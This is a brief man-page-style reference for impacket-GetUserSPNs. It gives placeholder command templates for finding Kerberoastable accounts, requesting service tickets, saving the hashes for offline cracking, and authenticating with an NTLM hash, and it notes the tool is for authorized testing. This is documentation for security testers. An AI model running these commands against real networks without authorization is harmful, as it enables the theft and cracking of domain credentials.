# TAGLINE

finds and requests Kerberos service tickets for user accounts with SPNs

# TLDR

**Find Kerberoastable accounts**

```impacket-GetUserSPNs [domain]/[user]:[password] -dc-ip [dc-ip]```

**Request service tickets**

```impacket-GetUserSPNs [domain]/[user]:[password] -dc-ip [dc-ip] -request```

**Output to file for cracking**

```impacket-GetUserSPNs [domain]/[user]:[password] -dc-ip [dc-ip] -request -outputfile [hashes.txt]```

**Use NTLM hash**

```impacket-GetUserSPNs -hashes :[hash] [domain]/[user] -dc-ip [dc-ip]```

# SYNOPSIS

**impacket-GetUserSPNs** [_options_] _target_

# PARAMETERS

**-dc-ip** _ip_
> Domain controller IP.

**-request**
> Request TGS tickets.

**-outputfile** _file_
> Save tickets to file.

**-hashes** _lm:nt_
> Use NTLM hashes.

**-k**
> Use Kerberos authentication.

# DESCRIPTION

**impacket-GetUserSPNs** finds and requests Kerberos service tickets for user accounts with SPNs (Service Principal Names). Part of the Impacket toolkit. Used for Kerberoasting attacks where TGS tickets can be cracked offline. For authorized security testing only.

# SEE ALSO

[impacket-gettgt](/man/impacket-gettgt)(1), [hashcat](/man/hashcat)(1)

